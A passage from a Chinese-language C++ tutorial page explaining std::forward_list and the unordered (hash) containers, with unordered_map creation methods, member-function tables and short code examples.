容器，forward_list 容器的功能受到了很多限制。比如，由于单链表只能从前向后遍历，而不支持反向遍历，因此 forward_list 容器只提供前向迭代器，而不是双向迭代器。这意味着，forward_list 容器不具有 rbegin()、rend() 之类的成员函数。</p><blockquote><p>既然 forward_list 容器具有和 list 容器相同的特性，list 容器还可以提供更多的功能函数，forward_list 容器有什么存在的必要呢？<br>虽然forward_list 容器底层使用单链表，也不是一无是处。比如，存储相同个数的同类型元素，单链表耗用的内存空间更少，空间利用率更高，并且对于实现某些操作单链表的执行效率也更高。<br>效率高是选用 forward_list 而弃用 list 容器最主要的原因，换句话说，只要是 list 容器和 forward_list 容器都能实现的操作，应优先选择 forward_list 容器。</p></blockquote><h5 id="1-forward-list容器的创建"><a href="#1-forward-list容器的创建" class="headerlink" title="1.forward_list容器的创建"></a>1.forward_list容器的创建</h5><p>由于 forward_list 容器以模板类 forward_list<T>（T 为存储元素的类型）的形式被包含在<forward_list>头文件中，并定义在 std 命名空间中。std 命名空间也可以在使用 forward_list 容器时额外注明，两种方式都可以。</p><blockquote><p><strong>1.创建一个没有任何元素的空 forward_list 容器：</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; values;<span class="hljs-comment">//由于 forward_list 容器在创建后也可以添加元素，因此这种创建方式很常见。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>2.创建一个包含 n 个元素的 forward_list 容器：</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">values</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<span class="hljs-comment">//通过此方式创建 values 容器，其中包含 10 个元素，每个元素的值都为相应类型的默认值（int类型的默认值为 0）。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>3.创建一个包含 n 个元素的 forward_list 容器，并为每个元素指定初始值。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">values</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>)</span></span>;<span class="hljs-comment">//创建了一个包含 10 个元素并且值都为 5 个 values 容器。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>4.在已有 forward_list 容器的情况下，通过拷贝该容器可以创建新的 forward_list 容器。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">value1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">value2</span><span class="hljs-params">(value1)</span></span>;<br><span class="hljs-comment">//采用此方式，必须保证新旧容器存储的元素类型一致。</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>5.通过拷贝其他类型容器（或者普通数组）中指定区域内的元素，可以创建新的 forward_list 容器。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//拷贝普通数组，创建forward_list容器</span><br><span class="hljs-keyword">int</span> a[] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> &#125;;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">values</span><span class="hljs-params">(a, a+<span class="hljs-number">5</span>)</span></span>;<br><span class="hljs-comment">//拷贝其它类型的容器，创建forward_list容器</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 5&gt;arr&#123; <span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span> &#125;;<br><span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt;values(arr.begin()+<span class="hljs-number">2</span>, arr.end());<span class="hljs-comment">//拷贝arr容器中的&#123;13,14,15&#125;</span><br></code></pre></div></td></tr></table></figure><h5 id="2-forward-list容器支持的成员函数"><a href="#2-forward-list容器支持的成员函数" class="headerlink" title="2.forward_list容器支持的成员函数"></a>2.forward_list容器支持的成员函数</h5><table><thead><tr><th>成员函数</th><th>功能</th></tr></thead><tbody><tr><td>before_begin()</td><td>返回一个前向迭代器，其指向容器中第一个元素之前的位置。</td></tr><tr><td>begin()</td><td>返回一个前向迭代器，其指向容器中第一个元素的位置。</td></tr><tr><td>end()</td><td>返回一个前向迭代器，其指向容器中最后一个元素之后的位置。</td></tr><tr><td>cbefore_begin()</td><td>和 before_begin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>empty()</td><td>判断容器中是否有元素，若无元素，则返回 true；反之，返回 false。</td></tr><tr><td>max_size()</td><td>返回容器所能包含元素个数的最大值。这通常是一个很大的值，一般是 232-1，所以我们很少会用到这个函数。</td></tr><tr><td>front()</td><td>返回第一个元素的引用。</td></tr><tr><td>assign()</td><td>用新元素替换容器中原有内容。</td></tr><tr><td>push_front()</td><td>在容器头部插入一个元素。</td></tr><tr><td>emplace_front()</td><td>在容器头部生成一个元素。该函数和 push_front() 的功能相同，但效率更高。</td></tr><tr><td>pop_front()</td><td>删除容器头部的一个元素。</td></tr><tr><td>emplace_after()</td><td>在指定位置之后插入一个新元素，并返回一个指向新元素的迭代器。和 insert_after() 的功能相同，但效率更高。</td></tr><tr><td>insert_after()</td><td>在指定位置之后插入一个新元素，并返回一个指向新元素的迭代器。</td></tr><tr><td>erase_after()</td><td>删除容器中某个指定位置或区域内的所有元素。</td></tr><tr><td>swap()</td><td>交换两个容器中的元素，必须保证这两个容器中存储的元素类型是相同的。</td></tr><tr><td>resize()</td><td>调整容器的大小。</td></tr><tr><td>clear()</td><td>删除容器存储的所有元素。</td></tr><tr><td>splice_after()</td><td>将某个 forward_list 容器中指定位置或区域内的元素插入到另一个容器的指定位置之后。</td></tr><tr><td>remove(val)</td><td>删除容器中所有等于 val 的元素。</td></tr><tr><td>remove_if()</td><td>删除容器中满足条件的元素。</td></tr><tr><td>unique()</td><td>删除容器中相邻的重复元素，只保留一个。</td></tr><tr><td>merge()</td><td>合并两个事先已排好序的 forward_list 容器，并且合并之后的 forward_list 容器依然是有序的。</td></tr><tr><td>sort()</td><td>通过更改容器中元素的位置，将它们进行排序。</td></tr><tr><td>reverse()</td><td>反转容器中元素的顺序。</td></tr></tbody></table><p>除此之外，C++ 11 标准库还新增加了 begin() 和 end() 这 2 个函数，和 forward_list 容器包含的 begin() 和 end() 成员函数不同，标准库提供的这 2 个函数的操作对象，既可以是容器，还可以是普通数组。当操作对象是容器时，它和容器包含的 begin() 和 end() 成员函数的功能完全相同；如果操作对象是普通数组，则 begin() 函数返回的是指向数组第一个元素的指针，同样 end() 返回指向数组中最后一个元素之后一个位置的指针（注意不是最后一个元素）。</p><p>forward_list 容器还有一个std::swap(x , y)非成员函数（其中 x 和 y 是存储相同类型元素的 forward_list 容器），它和 swap() 成员函数的功能完全相同，仅使用语法上有差异。</p><p>部分成员函数案例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;forward_list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; values&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>    values.emplace_front(<span class="hljs-number">4</span>);<span class="hljs-comment">//&#123;4,1,2,3&#125;</span><br>    values.emplace_after(values.before_begin(), <span class="hljs-number">5</span>); <span class="hljs-comment">//&#123;5,4,1,2,3&#125;</span><br>    values.reverse();<span class="hljs-comment">//&#123;3,2,1,4,5&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = values.begin(); it != values.end(); ++it) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//结果输出</span><br><span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>因为forward_list 容器中是不提供 size() 函数的，但如果想要获取 forward_list 容器中存储元素的个数，可以使用头文件 <iterator> 中的 distance() 函数。例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;forward_list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iterator&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; my_words&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-built_in">std</span>::distance(<span class="hljs-built_in">std</span>::begin(my_words), <span class="hljs-built_in">std</span>::end(my_words));<br>    <span class="hljs-built_in">cout</span> &lt;&lt; count;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>并且，forward_list 容器迭代器的移动除了使用 ++ 运算符单步移动，还能使用 advance() 函数，比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;forward_list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::forward_list&lt;<span class="hljs-keyword">int</span>&gt; values&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-keyword">auto</span> it = values.begin();<br>    advance(it, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">while</span> (it!=values.end())<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        ++it;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="二-无序关联式容器"><a href="#二-无序关联式容器" class="headerlink" title="二.无序关联式容器"></a>二.无序关联式容器</h3><p>除了序列式容器和关联式容器之外，C++ 11 标准库又引入了一类容器，即无序关联式容器。<br>无序关联式容器，又称哈希容器。和关联式容器一样，此类容器存储的也是键值对元素；不同之处在于，关联式容器默认情况下会对存储的元素做升序排序，而无序关联式容器不会。和其它类容器相比，无序关联式容器擅长通过指定键查找对应的值，而遍历容器中存储元素的效率不如关联式容器。<br>基于底层实现采用了不同的数据结构，因此和关联式容器相比，无序容器具有以下 2 个特点：</p><blockquote><p>1.无序容器内部存储的键值对是无序的，各键值对的存储位置取决于该键值对中的键，<br>2.和关联式容器相比，无序容器擅长通过指定键查找对应的值（平均时间复杂度为 O(1)）；但对于使用迭代器遍历容器中存储的元素，无序容器的执行效率则不如关联式容器。</p></blockquote><p>和关联式容器一样，无序容器只是一类容器的统称，其包含有 4 个具体容器，分别为 unordered_map、unordered_multimap、unordered_set 以及 unordered_multiset。</p><table><thead><tr><th>无序容器</th><th>功能</th></tr></thead><tbody><tr><td>unordered_map</td><td>存储键值对 &lt;key, value&gt; 类型的元素，其中各个键值对键的值不允许重复，且该容器中存储的键值对是无序的。</td></tr><tr><td>unordered_multimap</td><td>和 unordered_map 唯一的区别在于，该容器允许存储多个键相同的键值对。</td></tr><tr><td>unordered_set</td><td>不再以键值对的形式存储数据，而是直接存储数据元素本身（当然也可以理解为，该容器存储的全部都是键 key 和值 value 相等的键值对，正因为它们相等，因此只存储 value 即可）。另外，该容器存储的元素不能重复，且容器内部存储的元素也是无序的。</td></tr><tr><td>unordered_multiset</td><td>和 unordered_set 唯一的区别在于，该容器允许存储值相同的元素。</td></tr></tbody></table><p>以上 4 种无序容器的名称，仅是在前面所学的 4 种关联式容器名称的基础上，添加了 “unordered_”。如果已经学完了 map、multimap、set 和 multiset 容器不难发现，以 map 和 unordered_map 为例，其实它们仅有一个区别，即 map 容器内存会对存储的键值对进行排序，而 unordered_map 不会。</p><blockquote><p>C++ 11 标准的 STL 中，在已提供有 4 种关联式容器的基础上，又新增了各自的“unordered”版本（无序版本、哈希版本），提高了查找指定元素的效率。</p></blockquote><p>总的来说，实际场景中如果涉及大量遍历容器的操作，建议首选关联式容器；反之，如果更多的操作是通过键获取对应的值，则应首选无序容器。</p><p>以 unordered_map 容器为例，用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建并初始化一个 unordered_map 容器，其存储的 &lt;string,string&gt; 类型的键值对</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; my_uMap&#123;<br>        &#123;<span class="hljs-string">&quot;C语言教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//查找指定键对应的值，效率比关联式容器高</span><br>    <span class="hljs-built_in">string</span> str = my_uMap.at(<span class="hljs-string">&quot;C语言教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;str = &quot;</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//使用迭代器遍历哈希容器，效率不如关联式容器</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = my_uMap.begin(); iter != my_uMap.end(); ++iter)<br>    &#123;<br>        <span class="hljs-comment">//pair 类型键值对分为 2 部分</span><br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>str = https:<span class="hljs-comment">//lichengloong.com/</span><br>C语言教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Python教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Java教程 https:<span class="hljs-comment">//lichengloong.com/</span><br></code></pre></div></td></tr></table></figure><h4 id="1-unordered-map容器"><a href="#1-unordered-map容器" class="headerlink" title="1.unordered_map容器"></a>1.unordered_map容器</h4><p>unordered_map 容器在<unordered_map>头文件中，并位于 std 命名空间中。<br>unordered_map 容器，直译过来就是”无序 map 容器”的意思。所谓“无序”，指的是 unordered_map 容器不会像 map 容器那样对存储的数据进行排序。换句话说，unordered_map 容器和 map 容器仅有一点不同，即 map 容器中存储的数据是有序的，而 unordered_map 容器中是无序的。<br>对于已经学过 map 容器的，可以将 unordered_map 容器等价为无序的 map 容器。</p><p>具体来讲，unordered_map 容器和 map 容器一样，以键值对（pair类型）的形式存储数据，存储的各个键值对的键互不相同且不允许被修改。但由于 unordered_map 容器底层采用的是哈希表存储结构，该结构本身不具有对数据的排序功能，所以此容器内部不会自行对存储的键值对进行排序。</p><p>unordered_map 容器模板的定义如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Key</span>,                        //键值对中键的类型</span><br><span class="hljs-class">           <span class="hljs-keyword">class</span> <span class="hljs-title">T</span>,                          //键值对中值的类型</span><br><span class="hljs-class">           <span class="hljs-keyword">class</span> <span class="hljs-title">Hash</span> =</span> hash&lt;Key&gt;,           <span class="hljs-comment">//容器内部存储键值对所用的哈希函数</span><br>           <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pred</span> =</span> equal_to&lt;Key&gt;,       <span class="hljs-comment">//判断各个键值对键相同的规则</span><br>           <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Alloc</span> =</span> allocator&lt; <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">const</span> Key,T&gt; &gt;  <span class="hljs-comment">// 指定分配器对象的类型</span><br>           &gt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unordered_map</span>;</span><br></code></pre></div></td></tr></table></figure><p>以上 5 个参数中，必须显式给前 2 个参数传值，并且除特殊情况外，最多只需要使用前 4 个参数，各自的含义和功能如表 所示。</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>&lt;key,T&gt;</td><td>前 2 个参数分别用于确定键值对中键和值的类型，也就是存储键值对的类型。</td></tr><tr><td>Hash = hash<Key></td><td>用于指明容器在存储各个键值对时要使用的哈希函数，默认使用 STL 标准库提供的 hash<key> 哈希函数。注意，默认哈希函数只适用于基本数据类型（包括 string 类型），而不适用于自定义的结构体或者类。</td></tr><tr><td>Pred = equal_to<Key></td><td>要知道，unordered_map 容器中存储的各个键值对的键是不能相等的，而判断是否相等的规则，就由此参数指定。默认情况下，使用 STL 标准库中提供的 equal_to<key> 规则，该规则仅支持可直接用 == 运算符做比较的数据类型。</td></tr></tbody></table><p>总的来说，当无序容器中存储键值对的键为自定义类型时，默认的哈希函数 hash 以及比较函数 equal_to 将不再适用，只能自己设计适用该类型的哈希函数和比较函数，并显式传递给 Hash 参数和 Pred 参数。</p><h5 id="1-1创建方法"><a href="#1-1创建方法" class="headerlink" title="1.1创建方法"></a>1.1创建方法</h5><p>常见的创建 unordered_map 容器的方法有以下几种。</p><ol><li><p>通过调用 unordered_map 模板类的默认构造函数，可以创建空的 unordered_map 容器。比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; umap;<br></code></pre></div></td></tr></table></figure><p>这样就创建好了一个可存储 &lt;string,string&gt; 类型键值对的 unordered_map 容器。</p></li><li><p>在创建 unordered_map 容器的同时，可以完成初始化操作。比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; umap&#123;<br>    &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br></code></pre></div></td></tr></table></figure></li></ol><p>此方法创建的 umap 容器中，就包含有 3 个键值对元素。</p><ol start="3"><li>另外，还可以调用 unordered_map 模板中提供的复制（拷贝）构造函数，将现有 unordered_map 容器中存储的键值对，复制给新建 unordered_map 容器。<br>在第二种方式创建好 umap 容器的基础上，再创建并初始化一个 umap2 容器：<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">std::unordered_map&lt;std::string, std::string&gt; umap2(umap);<br></code></pre></div></td></tr></table></figure>由此，umap2 容器中就包含有 umap 容器中所有的键值对。</li></ol><p>除此之外，C++ 11 标准中还向 unordered_map 模板类增加了移动构造函数，即以右值引用的方式将临时 unordered_map 容器中存储的所有键值对，全部复制给新建容器。例如：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//返回临时 unordered_map 容器的函数</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span> &lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &gt; retUmap()&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;tempUmap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-keyword">return</span> tempUmap;<br>&#125;<br><span class="hljs-comment">//调用移动构造函数，创建 umap2 容器</span><br>std::unordered_map&lt;std::string, std::string&gt; umap2(retUmap());<br></code></pre></div></td></tr></table></figure><p>无论是调用复制构造函数还是拷贝构造函数，必须保证 2 个容器的类型完全相同。</p><ol start="4"><li>如果不想全部拷贝，可以使用 unordered_map 类模板提供的迭代器，在现有 unordered_map 容器中选择部分区域内的键值对，为新建 unordered_map 容器初始化。例如：<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//传入 2 个迭代器，</span><br>std::unordered_map&lt;std::string, std::string&gt; umap2(++umap.begin(),umap.end());<br></code></pre></div></td></tr></table></figure>通过此方式创建的 umap2 容器，其内部就包含 umap 容器中除第 1 个键值对外的所有其它键值对。</li></ol><h5 id="1-2-unordered-map容器的成员方法"><a href="#1-2-unordered-map容器的成员方法" class="headerlink" title="1.2 unordered_map容器的成员方法"></a>1.2 unordered_map容器的成员方法</h5><p>unordered_map 既可以看做是关联式容器，更属于自成一脉的无序容器。因此在该容器模板类中，既包含一些在学习关联式容器时常见的成员方法，还有一些属于无序容器特有的成员方法。</p><table><thead><tr><th>成员方法</th><th>功能</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个键值对的正向迭代器。</td></tr><tr><td>end()</td><td>返回指向容器中最后一个键值对之后位置的正向迭代器。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>empty()</td><td>若容器为空，则返回 true；否则 false。</td></tr><tr><td>size()</td><td>返回当前容器中存有键值对的个数。</td></tr><tr><td>max_size()</td><td>返回容器所能容纳键值对的最大个数，不同的操作系统，其返回值亦不相同。</td></tr><tr><td>operator[key]</td><td>该模板类中重载了 [] 